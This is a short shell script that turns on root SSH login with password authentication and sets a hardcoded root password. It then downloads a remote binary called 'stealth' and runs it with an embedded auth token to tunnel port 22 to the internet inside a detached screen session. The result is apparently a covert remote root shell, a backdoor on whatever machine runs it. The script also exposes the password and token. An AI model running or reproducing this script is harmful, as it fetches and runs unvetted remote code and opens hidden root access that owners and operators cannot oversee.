#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install nano iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo >/dev/null

sleep 3
sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
sleep 2
sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
sleep 2
echo "root:Pmataga87465622" | chpasswd
sleep 2
service ssh restart
sleep 2

netstat -ntlp

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/stealth >/dev/null
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 28kPyd6H1VF30yPsUo3RXRmASUp_5yU7HMTXqbGWKfuYEBRXH
sleep 2
screen -dmS ngroo bash -c './stealth tcp 22'
sleep 2

curl http://127.0.0.1:4040/api/tunnels
sleep 30
ping t.co
